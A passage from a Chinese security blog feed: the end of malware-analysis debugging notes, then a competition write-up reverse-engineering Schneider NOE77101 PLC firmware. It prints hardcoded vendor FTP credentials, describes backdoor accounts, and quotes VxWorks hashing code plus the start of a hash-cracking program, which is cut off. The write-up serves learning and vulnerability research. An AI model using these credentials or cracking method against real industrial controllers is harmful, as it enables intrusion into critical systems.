Detect)标志位，任何执行mov指令访问调试寄存器的操作都会触发中断。而这让你能够探测调试寄存器的改变。</p><blockquote><p>条件断点</p></blockquote><p>条件断点是软件断点的一种，它在某些条件满足时才会被触发。条件断点通过调试器总是接收的软断点来实现的。调试器计算条件，如果条件不满足，它自动继续执行而不通知用户。另外，不同的调试器支持不同的条件。</p><h2 id="8x4-异常"><a href="#8x4-异常" class="headerlink" title="8x4 异常"></a>8x4 异常</h2><p>异常是调试器取得运行程序控制权的基本方式。本质上，除了断点产生异常外，与调试无关的事件，如非法内存访问、除0操作也会产生异常</p><h3 id="1-首次和二次异常处理"><a href="#1-首次和二次异常处理" class="headerlink" title="1. 首次和二次异常处理"></a>1. 首次和二次异常处理</h3><p>调试器通常有两次机会来处理同一个异常：首次处理异常和二次处理异常。调试器第一次附加到进程时，会发生一个异常，然后被调试的程序停止执行，此时调试器开始获得控制权。调试器可以自己处理异常，也可以将异常转给被调试的应用程序处理。</p><p>如果程序注册了一个异常处理函数，它会在调试器处理异常后，获得处理异常的权限。<br>如果应用程序没有处理异常，调试器将获得另一个处理它的机会—— 二次异常处理。调试器接收到一个二次处理的异常后，意味着如果程序没有附加到调试器就会崩溃。为了让应用程序正常运行，调试器必须处理异常。</p><h3 id="2-常见异常"><a href="#2-常见异常" class="headerlink" title="2. 常见异常"></a>2. 常见异常</h3><blockquote><p>最常见的是执行INT 3指令时产生的异常。调试器有专门的代码处理INT 3<br>异常，而操作系统则把它和其他异常一样对待。<br>应用程序可能包含处理INT 3异常的指令，但附加调试器到程序后，调试器将获得首先处理异常权限。如果调试器将异常传给程序，程序的异常处理函数会处理它。</p><p>单步调试也作为操作系统内的一个异常来实现。标志寄存器中的陷阱标志（trap flag)用于单步 调试。陷阱标志置位后，处理器每执行一条指令就会产生异常。</p><p>当程序试图去访问一个它无权访问的内存位置时，将产生内存访问冲突（memory-access violation)异常。这种异常经常因为内存地址无效而发生，也可能是因为访问了受保护而无权访问的内存位置。</p><p>另外，一些指令只在处理器处于特权模式时才能执行。如果程序尝试着在非特权模式下执行它们，则处理器会产生异常。</p></blockquote><h2 id="8x5-使用调试器修改可执行文件"><a href="#8x5-使用调试器修改可执行文件" class="headerlink" title="8x5 使用调试器修改可执行文件"></a>8x5 使用调试器修改可执行文件</h2><p>调试器可以用来改变程序的执行方式。可以通过修改控制标志、指令指针或者代码本身等方式来改变程序执行的方式。</p><h2 id="8x6-修改可执行程序的实践"><a href="#8x6-修改可执行程序的实践" class="headerlink" title="8x6 修改可执行程序的实践"></a>8x6 修改可执行程序的实践</h2><p>End..</p><p>From <a href="https://kabeor.github.io/第8章 动态调试/">https://kabeor.github.io/第8章 动态调试/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第8章-动态调试&quot;&gt;&lt;a href=&quot;#第8章-动态调试&quot; class=&quot;headerlink&quot; title=&quot;第8章 动态调试&quot;&gt;&lt;/a&gt;第8章 动态调试&lt;/h1&gt;&lt;h2 id=&quot;8x1-源代码级与汇编级的调试器&quot;&gt;&lt;a href=&quot;#8x1-源代码级与汇编级的
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第三篇 动态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%89%E7%AF%87-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>施耐德NOE77101以太网模块固件逆向及后门挖掘</title>
    <link href="https://kabeor.github.io/%E6%96%BD%E8%80%90%E5%BE%B7NOE77101%E4%BB%A5%E5%A4%AA%E7%BD%91%E6%A8%A1%E5%9D%97%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%8F%8A%E5%90%8E%E9%97%A8%E6%8C%96%E6%8E%98/"/>
    <id>https://kabeor.github.io/施耐德NOE77101以太网模块固件逆向及后门挖掘/</id>
    <published>2018-07-09T08:20:21.366Z</published>
    <updated>2018-07-19T05:30:35.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施耐德NOE77101以太网模块固件逆向及后门挖掘"><a href="#施耐德NOE77101以太网模块固件逆向及后门挖掘" class="headerlink" title="施耐德NOE77101以太网模块固件逆向及后门挖掘"></a>施耐德NOE77101以太网模块固件逆向及后门挖掘</h1><p>前几天参加了 2018工业信息安全技能大赛 ，之前从没有接触过工控安全，这次的比赛让我学习了很多。</p><p>此次比赛其中一道题就是考察了施耐德NOE77101固件后门账号漏洞的问题，比赛题目要求是提交该固件Web配置APP的默认账号的密码，事实上这个版本的固件还有其他漏洞，我将在下面研究其中的一部分。</p><blockquote><p>部分思路参考了此次比赛主办方灯塔实验室的文章 <a href="http://t.cn/RdORUWo" target="_blank" rel="noopener">http://t.cn/RdORUWo</a></p></blockquote><p>NOE 771是施耐德Quantum系列PLC的以太网模块，Quantum系列PLC是施耐德的高端PLC，应用在我国核心能源调度网络系统中，如：西气东输的区域子段SCADA系统。</p><h2 id="1-静态网站分析"><a href="#1-静态网站分析" class="headerlink" title="1.静态网站分析"></a>1.静态网站分析</h2><p>题目给了一个网站文件如下<br><img src="https://i.loli.net/2018/07/19/5b50212a8e4c2.jpg" alt="mark"></p><p><strong>文件列表</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLASH0</span><br><span class="line">FLASH0/bin</span><br><span class="line">FLASH0/ftp</span><br><span class="line">FLASH0/fw</span><br><span class="line">FLASH0/gdt</span><br><span class="line">FLASH0/rdt</span><br><span class="line">FLASH0/webloader.ini</span><br><span class="line">FLASH0/wwwroot</span><br><span class="line">FLASH0/bin/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/ftp/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/fw/crashlog.txt</span><br><span class="line">FLASH0/fw/fw.ini //固件版本</span><br><span class="line">FLASH0/fw/hw.ini</span><br><span class="line">FLASH0/gdt/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/rdt/password.rde //调用密码</span><br><span class="line">FLASH0/wwwroot/cgi-bin</span><br><span class="line">FLASH0/wwwroot/classes</span><br><span class="line">FLASH0/wwwroot/conf</span><br><span class="line">FLASH0/wwwroot/html</span><br><span class="line">FLASH0/wwwroot/images</span><br><span class="line">FLASH0/wwwroot/index.htm //web首页文件</span><br><span class="line">FLASH0/wwwroot/lib</span><br><span class="line">FLASH0/wwwroot/SchneiderTFE.zip //施耐德MIB文件</span><br><span class="line">FLASH0/wwwroot/secure</span><br><span class="line">FLASH0/wwwroot/unsecure</span><br><span class="line">FLASH0/wwwroot/cgi-bin/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/classes/jvmver.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/RDE.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/SAComm.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/SysDiag.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/webcfg.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/webdiag.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/XMLParser.jar//JAVA APP</span><br><span class="line">FLASH0/wwwroot/classes/xmlrpc-1.1.jar //JAVA APP</span><br><span class="line">FLASH0/wwwroot/conf/bootp</span><br><span class="line">FLASH0/wwwroot/conf/dhcp</span><br><span class="line">FLASH0/wwwroot/conf/diag</span><br><span class="line">FLASH0/wwwroot/conf/exec</span><br><span class="line">FLASH0/wwwroot/conf/fw</span><br><span class="line">FLASH0/wwwroot/conf/Gcnftcop.sys</span><br><span class="line">FLASH0/wwwroot/conf/glbdata</span><br><span class="line">FLASH0/wwwroot/conf/ioscanner</span><br><span class="line">FLASH0/wwwroot/conf/snmp</span><br><span class="line">FLASH0/wwwroot/conf/bootp/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/conf/dhcp/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/conf/diag/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/conf/exec/kerVer</span><br><span class="line">FLASH0/wwwroot/conf/exec/NOE77101.bin //Quantum Ethernet Executive firmware Ver. 3.60</span><br><span class="line">FLASH0/wwwroot/conf/fw/fw.ini</span><br><span class="line">FLASH0/wwwroot/conf/glbdata/glbdata.ini</span><br><span class="line">FLASH0/wwwroot/conf/ioscanner/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/conf/snmp/snmp.ini</span><br><span class="line">FLASH0/wwwroot/html/config.js //定义了WEB界面title可做通用设备识别</span><br><span class="line">FLASH0/wwwroot/html/english</span><br><span class="line">FLASH0/wwwroot/html/images</span><br><span class="line">FLASH0/wwwroot/html/lib</span><br><span class="line">FLASH0/wwwroot/html/english/control</span><br><span class="line">FLASH0/wwwroot/html/english/diagnostic</span><br><span class="line">FLASH0/wwwroot/html/english/documentation</span><br><span class="line">FLASH0/wwwroot/html/english/header.htm</span><br><span class="line">FLASH0/wwwroot/html/english/home</span><br><span class="line">FLASH0/wwwroot/html/english/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/maintenance</span><br><span class="line">FLASH0/wwwroot/html/english/monitoring</span><br><span class="line">FLASH0/wwwroot/html/english/setup</span><br><span class="line">FLASH0/wwwroot/html/english/control/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/control/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/diagnostic/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/diagnostic/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/documentation/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/documentation/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/home/home.htm</span><br><span class="line">FLASH0/wwwroot/html/english/home/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/home/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/maintenance/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/maintenance/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/monitoring/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/monitoring/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/english/setup/index.htm</span><br><span class="line">FLASH0/wwwroot/html/english/setup/menu.htm</span><br><span class="line">FLASH0/wwwroot/html/images/noe77101.jpg //产品型号图片</span><br><span class="line">FLASH0/wwwroot/html/images/Telemecanique.gif</span><br><span class="line">FLASH0/wwwroot/html/images/TelemecaniquePocketPC.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/css</span><br><span class="line">FLASH0/wwwroot/html/lib/images</span><br><span class="line">FLASH0/wwwroot/html/lib/js</span><br><span class="line">FLASH0/wwwroot/html/lib/css/header.css</span><br><span class="line">FLASH0/wwwroot/html/lib/css/main.css</span><br><span class="line">FLASH0/wwwroot/html/lib/css/menu.css</span><br><span class="line">FLASH0/wwwroot/html/lib/images/left.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/images/moins.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/images/plus.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/images/right.gif</span><br><span class="line">FLASH0/wwwroot/html/lib/js/header.js</span><br><span class="line">FLASH0/wwwroot/html/lib/js/home.js</span><br><span class="line">FLASH0/wwwroot/html/lib/js/index.js</span><br><span class="line">FLASH0/wwwroot/html/lib/js/menu.js</span><br><span class="line">FLASH0/wwwroot/html/lib/js/tools.js</span><br><span class="line">FLASH0/wwwroot/images/eight_io.gif</span><br><span class="line">FLASH0/wwwroot/images/empty.gif</span><br><span class="line">FLASH0/wwwroot/images/hiendcpu.gif</span><br><span class="line">FLASH0/wwwroot/images/logo.gif</span><br><span class="line">FLASH0/wwwroot/images/miniplc.gif</span><br><span class="line">FLASH0/wwwroot/images/module.gif</span><br><span class="line">FLASH0/wwwroot/lib/home.js</span><br><span class="line">FLASH0/wwwroot/lib/main.css</span><br><span class="line">FLASH0/wwwroot/lib/main.js</span><br><span class="line">FLASH0/wwwroot/secure/embedded</span><br><span class="line">FLASH0/wwwroot/secure/system</span><br><span class="line">FLASH0/wwwroot/secure/user</span><br><span class="line">FLASH0/wwwroot/secure/embedded/bandwidth.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/chkdsk.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/classes</span><br><span class="line">FLASH0/wwwroot/secure/embedded/dhcp_node_config.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/format_flash.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/french</span><br><span class="line">FLASH0/wwwroot/secure/embedded/ftp_passwd_config.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/german</span><br><span class="line">FLASH0/wwwroot/secure/embedded/globaldata.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/http_passwd_config.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/images</span><br><span class="line">FLASH0/wwwroot/secure/embedded/ioscanning.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/messaging.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/reboot.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/set_readonly.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/smtpconf.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/smtpdiag.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/spanish</span><br><span class="line">FLASH0/wwwroot/secure/embedded/support.htm</span><br><span class="line">FLASH0/wwwroot/secure/embedded/web_page_Ver.ini</span><br><span class="line">FLASH0/wwwroot/secure/embedded/classes/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/embedded/french/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/embedded/german/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/embedded/images/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/embedded/spanish/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/secure/system/ctrlstat.htm</span><br><span class="line">FLASH0/wwwroot/secure/system/ethernet.htm</span><br><span class="line">FLASH0/wwwroot/secure/system/plccfg.htm</span><br><span class="line">FLASH0/wwwroot/secure/system/rde.htm</span><br><span class="line">FLASH0/wwwroot/secure/system/riostat.htm</span><br><span class="line">FLASH0/wwwroot/secure/user/$TMP_EMPTY_DIR</span><br><span class="line">FLASH0/wwwroot/unsecure/user</span><br><span class="line">FLASH0/wwwroot/unsecure/user/$TMP_EMPTY_DIR</span><br></pre></td></tr></table></figure></p><p><strong>fw/fw.ini文件内是固件版本，可以看到是3.60版本</strong><br><img src="https://i.loli.net/2018/07/19/5b50212aa5d39.jpg" alt="mark"></p><p><strong>wwwroot/classes/内的jar文件即是Web配置端APP文件</strong><br><img src="https://i.loli.net/2018/07/19/5b50212abff53.jpg" alt="mark"></p><p><strong>wwwroot/conf/exec/NOE77101.bin很明显就是NOE77101的固件了</strong><br><img src="https://i.loli.net/2018/07/19/5b50212adfc34.jpg" alt="mark"></p><p>那么接下来我们所要做的就是分析jar格式的APP文件，这也是此次题目所要求的，然后再研究bin文件中的其他漏洞</p><h2 id="2-Web配置APP默认账户及密码的获取"><a href="#2-Web配置APP默认账户及密码的获取" class="headerlink" title="2.Web配置APP默认账户及密码的获取"></a>2.Web配置APP默认账户及密码的获取</h2><p>针对jar包的逆向分析，常使用的工具是JD-GUI，安装该工具需要配置java环境。</p><p>打开后拖入所有jar包<br><img src="https://i.loli.net/2018/07/19/5b50212b11461.jpg" alt="mark"></p><p>发现没有加壳和混淆，于是我们直奔主题，搜索字符串PASSWORD<br><img src="https://i.loli.net/2018/07/19/5b50212b3d26f.jpg" alt="mark"></p><p>密码来的太突然了</p><blockquote><p>USER = “sysdiag”<br>PASSWORD = “factorycast@schneider”</p></blockquote><p><img src="https://i.loli.net/2018/07/19/5b50212b599c6.jpg" alt="mark"><br>可以看到是ftp连接的默认账号及密码</p><p>到这里题目所要求的就完成了</p><h2 id="3-bin固件分析"><a href="#3-bin固件分析" class="headerlink" title="3.bin固件分析"></a>3.bin固件分析</h2><h3 id="1-binwalk提取文件"><a href="#1-binwalk提取文件" class="headerlink" title="1.binwalk提取文件"></a>1.binwalk提取文件</h3><p>将NOE77101.bin在Ubuntu环境下用binwalk进行识别，显示为Zlib压缩类型<br><img src="https://i.loli.net/2018/07/19/5b50212b77c89.jpg" alt="mark"></p><p>使用<code>binwalk -e</code>命令提取文件<br><img src="https://i.loli.net/2018/07/19/5b50212b9494d.jpg" alt="mark"><br>解压后的文件217存储在_NOE77101.bin.extracted目录中，并以文件在固件升级包中的起始位置来命名。</p><p>binwalk分析217文件<br><img src="https://i.loli.net/2018/07/19/5b50212bbc928.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b5021407fa27.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b502140a5855.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2406504       0x24B868        VxWorks WIND kernel version &quot;2.5&quot;</span><br><span class="line">2421452       0x24F2CC        Copyright string: &quot;Copyright Wind River Systems, Inc., 1984-2000&quot;</span><br><span class="line">2435046       0x2527E6        Unix path: /host/resource/tcl/wtxerrdb.tcl</span><br><span class="line">2529396       0x269874        Copyright string: &quot;copyright_wind_river&quot;</span><br><span class="line">3232572       0x31533C        Copyright string: &quot;Copyright, Real-Time Innovations, Inc., 1991.  All rights reserved.&quot;</span><br><span class="line">3244384       0x318160        Copyright string: &quot;Copyright 1984-1996 Wind River Systems, Inc.&quot;</span><br><span class="line">3272404       0x31EED4        VxWorks symbol table, big endian, first entry: [type: function, code address: 0x223D64, symbol address: 0x2A8BC8]</span><br></pre></td></tr></table></figure><p>从最后几行看到，固件的操作系统版本是VxWorks 2.5，符号表地址也在最后给出，可以用于稍后修复函数名</p><blockquote><p>VxWorks 操作系统是美国WindRiver（风河）公司于设计开发。它以其良好的可靠性和卓越的实时性被广泛地应用在通信、军事、航空、航天等高精尖技术及实时性要求极高的领域中，如卫星通讯、军事演习、弹道制导、飞机导航等。在美国的 F-16、FA-18战斗机、B-2 隐形轰炸机和爱国者导弹上，甚至在火星登陆的探测器也都使用了VxWorks系统。最新的VxWorks7的口号是——为全球智能连接设备和系统提供动力。</p><p>由于固件特性，在普通逆向步骤上需要多三个部分</p><ol><li>修复代码函数位置</li><li>确定固件代码段基址</li><li>重构符号表</li></ol></blockquote><h3 id="2-IDA分析"><a href="#2-IDA分析" class="headerlink" title="2.IDA分析"></a>2.IDA分析</h3><h4 id="载入"><a href="#载入" class="headerlink" title="载入"></a>载入</h4><p>将217文件在IDA中分析<br>IDA加载固件后使用PPC Big-endian（PowerPC大端）处理器类型。<br><img src="https://i.loli.net/2018/07/19/5b502140c2b33.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b502140d7195.jpg" alt="mark"></p><p>载入后没有出现“由于找不到代码段起始地址从而反编译失败”的问题，应该是出题人为了降低难度，已经修复好函数位置。(如果没有修复好的话可以用Ruben的idc脚本，但现在脚本链接不能访问了 <a href="http://www.reversemode.com/images/stories/schneider/files/fix_functions_ppc.idc" target="_blank" rel="noopener">http://www.reversemode.com/images/stories/schneider/files/fix_functions_ppc.idc</a>)</p><p>载入后如下<br><img src="https://i.loli.net/2018/07/19/5b50214106755.jpg" alt="mark"></p><h4 id="确定固件的代码段基址"><a href="#确定固件的代码段基址" class="headerlink" title="确定固件的代码段基址"></a>确定固件的代码段基址</h4><p>虽然现在我们可以成功反编译，但我们还需要确定固件的代码段基址才能重构符号表<br>确定基址的思路是寻找一条相对寻址方式的lis指令。<br><img src="https://i.loli.net/2018/07/19/5b5021411a2fa.jpg" alt="mark"></p><p>在IDA中使用ALT+T直接搜lis指令，CTRL+T进行向下(上)搜索，发现在<code>00000AA0</code>处的lis指令<br><img src="https://i.loli.net/2018/07/19/5b5021412daed.jpg" alt="mark"></p><p><code>ROM:00000AA0       lis       r9, dword_358848@ha</code></p><p>观察地址后面的@ha确定基址为0x10000,这也是固件常用基址</p><p>对@h和@ha的问题，在IBM官网看到一篇文章</p><blockquote><p><a href="https://www.ibm.com/developerworks/cn/linux/hardware/ppc/assembly/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/hardware/ppc/assembly/index.html</a><br><img src="https://i.loli.net/2018/07/19/5b50214142c8e.jpg" alt="mark"></p></blockquote><p>具体也不是很懂，还有这篇</p><blockquote><p><a href="http://blog.chinaunix.net/uid-20663797-id-35772.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-20663797-id-35772.html</a></p></blockquote><p>接下来重新载入ida，ppc模式，基址0x10000<br><img src="https://i.loli.net/2018/07/19/5b50214155d97.jpg" alt="mark"></p><p>成功反编译(和刚刚的应该没有变化)</p><p>接下来就该导入符号表了</p><h4 id="重构符号表"><a href="#重构符号表" class="headerlink" title="重构符号表"></a>重构符号表</h4><p>binwalk分析217文件时最后一行的符号表地址还记得吗？<br><img src="https://i.loli.net/2018/07/19/5b5021f2f24a9.jpg" alt="mark"></p><p>地址为<code>0x31EED4</code></p><p>使用010Editor打开217文件，搜索地址0x31EED4(ctrl+G)<br><img src="https://i.loli.net/2018/07/19/5b5021417134c.jpg" alt="mark"></p><blockquote><p>VxWorks系列的字节排序有独特的格式，以16个字节为一组数据，前4个字节是函数名的内存地址，后4个字节是函数的内存位置，然后以另4个特征字节数据+4个字节0x00结尾。</p></blockquote><p>于是符号表的起始地址是上一行的<strong><code>0x31EEC4</code></strong></p><p>一直向下查找，根据结构分析，结束地址为<strong><code>0x348114</code></strong><br><img src="https://i.loli.net/2018/07/19/5b5021f317c30.jpg" alt="mark"></p><p>接下来我们就可以编写IDPython脚本重构符号表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from idaapi import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">eaStart = 0x31eec4 </span><br><span class="line">eaEnd = 0x348114</span><br><span class="line">ea = eaStart</span><br><span class="line">while ea &lt; eaEnd:</span><br><span class="line">offset = 0</span><br><span class="line">MakeStr(Dword(ea - offset), BADADDR)</span><br><span class="line">sName = GetString(Dword(ea - offset), -1, ASCSTR_C)</span><br><span class="line">print sName</span><br><span class="line">if sName:</span><br><span class="line">eaFunc = Dword(ea - offset + 4)</span><br><span class="line">MakeName(eaFunc,sName)</span><br><span class="line">MakeCode(eaFunc)</span><br><span class="line">MakeFunction(eaFunc,BADADDR)</span><br><span class="line">ea = ea + 16</span><br><span class="line">print&quot;ok&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/19/5b5021f33ad49.jpg" alt="mark"></p><p>运行脚本<br><img src="https://i.loli.net/2018/07/19/5b5021f35a8ec.jpg" alt="mark"><br>修复完成</p><h4 id="固件后门账户"><a href="#固件后门账户" class="headerlink" title="固件后门账户"></a>固件后门账户</h4><p>查看usrAppInit函数，发现多个后门账户<br><img src="https://i.loli.net/2018/07/19/5b5021f37329a.jpg" alt="mark"></p><p>而密码则是经过loginDefaultEncrypt函数哈希加密<br>结合vxworks5的源码来看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/******************************************************************************</span><br><span class="line">*</span><br><span class="line">* loginDefaultEncrypt - default password encryption routine</span><br><span class="line">*</span><br><span class="line">* This routine provides default encryption for login passwords.  It employs</span><br><span class="line">* a simple encryption algorithm.  It takes as arguments a string &lt;in&gt; and a</span><br><span class="line">* pointer to a buffer &lt;out&gt;.  The encrypted string is then stored in the</span><br><span class="line">* buffer.</span><br><span class="line">*</span><br><span class="line">* The input strings must be at least 8 characters and no more than 40</span><br><span class="line">* characters.</span><br><span class="line">*</span><br><span class="line">* If a more sophisticated encryption algorithm is needed, this routine can</span><br><span class="line">* be replaced, as long as the new encryption routine retains the same</span><br><span class="line">* declarations as the default routine.  The routine vxencrypt</span><br><span class="line">* in \f3host/&lt;hostOs&gt;/bin\fP</span><br><span class="line">* should also be replaced by a host version of &lt;encryptionRoutine&gt;.  For more</span><br><span class="line">* information, see the manual entry for loginEncryptInstall().</span><br><span class="line">*</span><br><span class="line">* RETURNS: OK, or ERROR if the password is invalid.</span><br><span class="line">*</span><br><span class="line">* SEE ALSO: loginEncryptInstall(), vxencrypt</span><br><span class="line">*</span><br><span class="line">* INTERNAL</span><br><span class="line">* The encryption is done by summing the password and multiplying it by</span><br><span class="line">* a magic number.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">STATUS loginDefaultEncrypt</span><br><span class="line">    (</span><br><span class="line">    char *in,                           /* input string */</span><br><span class="line">    char *out                           /* encrypted string */</span><br><span class="line">    )</span><br><span class="line">    &#123;</span><br><span class="line">    int            ix;</span><br><span class="line">    unsigned long  magic     = 31695317;</span><br><span class="line">    unsigned long  passwdInt = 0;</span><br><span class="line"></span><br><span class="line">   if (strlen (in) &lt; 8 || strlen (in) &gt; 40)</span><br><span class="line">        &#123;</span><br><span class="line">errnoSet (S_loginLib_INVALID_PASSWORD);</span><br><span class="line">        return (ERROR);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    for (ix = 0; ix &lt; strlen(in); ix++)         /* sum the string */</span><br><span class="line">        passwdInt += (in[ix]) * (ix+1) ^ (ix+1);</span><br><span class="line"></span><br><span class="line">    sprintf (out, &quot;%u&quot;, (long) (passwdInt * magic)); /* convert interger</span><br><span class="line">to string */</span><br><span class="line">    /* make encrypted passwd printable */</span><br><span class="line"></span><br><span class="line">    for (ix = 0; ix &lt; strlen (out); ix++)</span><br><span class="line">        &#123;</span><br><span class="line">        if (out[ix] &lt; &apos;3&apos;)</span><br><span class="line">            out[ix] = out[ix] + &apos;!&apos;;    /* arbitrary */</span><br><span class="line"></span><br><span class="line">        if (out[ix] &lt; &apos;7&apos;)</span><br><span class="line">            out[ix] = out[ix] + &apos;/&apos;;    /* arbitrary */</span><br><span class="line"></span><br><span class="line">        if (out[ix] &lt; &apos;9&apos;)</span><br><span class="line">            out[ix] = out[ix] + &apos;B&apos;;    /* arbitrary */</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    return (OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/19/5b5021f38a71a.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b5021f39f749.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b5021f3b3958.jpg" alt="mark"></p><p>结合源码看汇编就非常清晰了</p><blockquote><p>加密过程：</p><p>1.在第一个for循环中密码字符串逐字节与位置下标相乘再按位进行异或操作，然后将每一个字符的运算结果累加起来算出passwdInt。<br>2.passwdInt值与magic相乘再转化为String类型。<br>3.字符串逐字符与’3’、’7’、’9’进行比较，加相应的值。</p><p>可以通过随机生成密码来构建一个序列化的输入密码和passwdInt的对应表，同时passwdInt与输出密码之间也可构建对应表，这样输入密码和输出密码讲通过长度有限的Int类型passwdInt打通，这样我们就能通过查表的方式由输出密码得到输入密码。相比于MD5、SHA1等加密算法，vxencrypt加密算法由于加密方式问题导致密文长度受限，以至于存在弱点。</p></blockquote><p>Rapid7 研究员HD Moore曾经发现VxWorks 5.x系统默认加密方式存在缺陷的研究文章</p><blockquote><p><a href="http://cvk.posthaven.com/how-to-crack-vxworks-password-hashes" target="_blank" rel="noopener">http://cvk.posthaven.com/how-to-crack-vxworks-password-hashes</a></p></blockquote><p>解密程序</p><blockquote><p><a href="https://github.com/cvonkleist/vxworks_hash" target="_blank" rel="noopener">https://github.com/cvonkleist/vxworks_hash</a></p></blockquote><p>这里贴上C的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// cvk/2010-08-09</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">// password settings</span><br><span class="line">#define MIN_LENGTH 8</span><br><span class="line">#define MAX_LENGTH 40</span><br><span class="line">char *charset = &quot; !\&quot;#$%&amp;&apos;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;;</span><br><span class="line">#define CHARSET_LENGTH 95</span><br><span class="line"></span><br><span class="line">// shortcut hash table</span><br><span class="line">#define MAX_SUM 110000</span><br><span class="line">char sums[MAX_SUM][MAX_LENGTH + 1];</span><br><span class="line"></span><br><span class="line">// stage one of the hashing algorithm: the sum</span><br><span class="line">unsigned long sum(char *plaintext) &#123;</span><br><span class="line">  unsigned long s = 0;</span><br><span class="line">  int i;</span><br><span class="line">  for (i = 0; i &lt; strlen(plaintext); i++)</span><br><span class="line">    s += (plaintext[i]) * (i + 1) ^ (i + 1);</span><br><span class="line">  return s;</span><br><span 